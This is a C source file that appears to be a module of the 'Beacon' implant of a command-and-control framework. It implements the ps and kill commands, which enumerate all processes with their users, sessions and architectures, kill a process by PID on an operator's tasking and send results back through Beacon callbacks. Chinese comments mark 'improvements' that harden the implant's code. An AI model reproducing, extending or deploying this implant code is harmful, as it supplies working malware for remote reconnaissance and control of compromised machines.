/*
 * List and Kill Processes
 */
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "tokens.h"
#include "commands.h"
#include "parse.h"
#include "beacon.h"
#include "bformat.h"

// 改进：添加常量定义
#define MAX_USERNAME_LEN 256
#define MAX_PROCESS_NAME_LEN 256
#define OUTPUT_BUFFER_SIZE 65536

void command_ps_kill(char * buffer, int length) {
    HANDLE h = NULL;
    DWORD pid;
    datap parser = {0};

    // 改进：添加输入验证
    if (buffer == NULL || length <= 0) {
        return;
    }

    /* extract our PID */
    data_init(&parser, buffer, length);
    pid = data_int(&parser);

    // 改进：验证PID有效性
    if (pid == 0) {
        post_error_dd(0x23, pid, ERROR_INVALID_PARAMETER);
        return;
    }

    h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (h && TerminateProcess(h, 0)) {
        /* do nothing, we're good */
    }
    else {
        post_error_dd(0x23, pid, GetLastError());
    }

    // 改进：确保句柄始终被关闭
    if (h != NULL) {
        CloseHandle(h);
    }
}

/* Get the username for a process */
BOOL ps_getusername( HANDLE hProcess, char * buffer, DWORD length ) {
    HANDLE hToken = NULL;
    BOOL result = FALSE;

    // 改进：添加输入验证
    if (hProcess == NULL || buffer == NULL || length == 0) {
        return FALSE;
    }

    if( !OpenProcessToken(hProcess, TOKEN_QUERY, &hToken ))
        return FALSE;
        
    result = token_user(hToken, buffer, length);
    
    // 改进：确保token句柄始终被关闭
    if (hToken != NULL) {
        CloseHandle( hToken );
    }

    return result;
}

/* check if a process is x64 or not */
BOOL is_x64_process(HANDLE process) {
    // 改进：添加输入验证
    if (process == NULL) {
        return FALSE;
    }

    if (is_x64() || is_wow64(GetCurrentProcess())) {
        return !is_wow64(process);
    }

    return FALSE;
}

void command_ps_list(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
    HANDLE hProcessSnap = INVALID_HANDLE_VALUE;
    HANDLE hProcess = NULL;
    PROCESSENTRY32 pe32 = {0};
    char user[MAX_USERNAME_LEN] = {0};
    formatp format = {0};
    DWORD sessid = 0;
    char * x64 = "x64";
    char * x86 = "x86";
    char * arch = NULL;
    char * native = NULL;
    datap parser = {0};
    int reqid = 0;
    BOOL bResult = FALSE;

    // 改进：添加输入验证
    if (buffer == NULL || length <= 0 || callback == NULL) {
        return;
    }

    /* init our data parser */
    data_init(&parser, buffer, length);

    /* extract our callback ID */
    reqid = data_int(&parser);

    /* init our output buffer */
    bformat_init(&format, OUTPUT_BUFFER_SIZE);

    /* copy the callback ID to our output */
    if (reqid > 0)
        bformat_int(&format, reqid);

    /* check what kind of process we are...  since Beacon is 32-bit only */
    if (is_wow64(GetCurrentProcess()))
        native = x64;
    else
        native = is_x64() ? x64 : x86;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
    if ( hProcessSnap == INVALID_HANDLE_VALUE ) {
        bformat_free(&format);
        return;
    }

    // Set the size of the structure before using it.
    pe32.dwSize = sizeof( PROCESSENTRY32 );

    // Retrieve information about the first process,
    // and exit if unsuccessful
    if( !Process32First( hProcessSnap, &pe32 ) ) {
        CloseHandle( hProcessSnap );
        bformat_free(&format);
        return;
    }

    // Now walk the snapshot of processes, and
    // display information about each process in turn
    do {
        // 改进：重置变量状态
        hProcess = NULL;
        user[0] = '\0';
        sessid = 0;
        arch = x86; // 默认假设x86

        hProcess = OpenProcess(is_vista_or_later() ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID );

        if( !hProcess ) {
            // 改进：确保进程名不超过缓冲区大小
            char safe_name[MAX_PROCESS_NAME_LEN];
            strncpy_s(safe_name, sizeof(safe_name), pe32.szExeFile, _TRUNCATE);
            bformat_printf(&format, "%s\t%d\t%d\n", safe_name, pe32.th32ParentProcessID, pe32.th32ProcessID);
        }
        else {
            // 改进：更安全的用户名获取
            if (!ps_getusername(hProcess, user, MAX_USERNAME_LEN)) {
                user[0] = '\0';
            }

            // 改进：更安全的会话ID获取
            if (!ProcessIdToSessionId(pe32.th32ProcessID, &sessid)) {
                sessid = (DWORD)-1;
            }

            // 改进：更准确的架构检测
            if (is_wow64(hProcess)) {
                arch = x86;
            }
            else {
                arch = native;
            }

            // 改进：确保进程名安全
            char safe_name[MAX_PROCESS_NAME_LEN];
            strncpy_s(safe_name, sizeof(safe_name), pe32.szExeFile, _TRUNCATE);
            
            // 改进：确保用户名安全
            char safe_user[MAX_USERNAME_LEN];
            strncpy_s(safe_user, sizeof(safe_user), user, _TRUNCATE);

            bformat_printf(&format, "%s\t%d\t%d\t%s\t%s\t%d\n", 
                safe_name, pe32.th32ParentProcessID, pe32.th32ProcessID, 
                arch, safe_user, sessid);

            // 改进：确保进程句柄被关闭
            CloseHandle(hProcess);
            hProcess = NULL;
        }
    }
    while( Process32Next( hProcessSnap, &pe32 ) );

    // 改进：确保快照句柄被关闭
    if (hProcessSnap != INVALID_HANDLE_VALUE) {
        CloseHandle( hProcessSnap );
    }

    // 改进：检查输出缓冲区是否有效
    if (bformat_string(&format) != NULL) {
        if (reqid == 0) {
            callback(bformat_string(&format), bformat_length(&format), CALLBACK_PROCESS_LIST);
        }
        else {
            callback(bformat_string(&format), bformat_length(&format), CALLBACK_PENDING);
        }
    }

    bformat_free(&format);
}
